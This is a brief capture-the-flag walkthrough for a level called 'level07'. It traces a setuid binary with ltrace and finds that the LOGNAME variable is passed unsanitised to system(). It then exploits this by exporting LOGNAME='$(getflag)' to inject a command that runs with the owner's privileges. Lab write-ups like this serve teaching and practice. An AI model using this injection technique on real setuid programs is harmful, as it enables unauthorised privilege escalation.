solution level07:

> ls -l
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
 
we have an executable file, belonging to user flag07 (with the setuid control bit on)
executing the program outputs "level07"

-> we can use the tool ltrace to look up some of the code:
> ltrace ./level07
...
getenv("LOGNAME")                                                            = "level07"
asprintf(0xbffff714, 0x8048688, 0xbfffff57, 0xb7e5ee55, 0xb7fed280)          = 18
system("/bin/echo level07 "level07
...

the program seems to get the value of the LOGNAME environment variable as a string (getenv("LOGNAME"))
this string seems to be used later as the parameter of the shell command echo executed via the 'system()' function
we know we can execute a command and print its output with `echo $(...)`

-> we change the value of LOGNAME so that echo prints the output of the getflag command:
> export LOGNAME='$(getflag)'

> ./level07
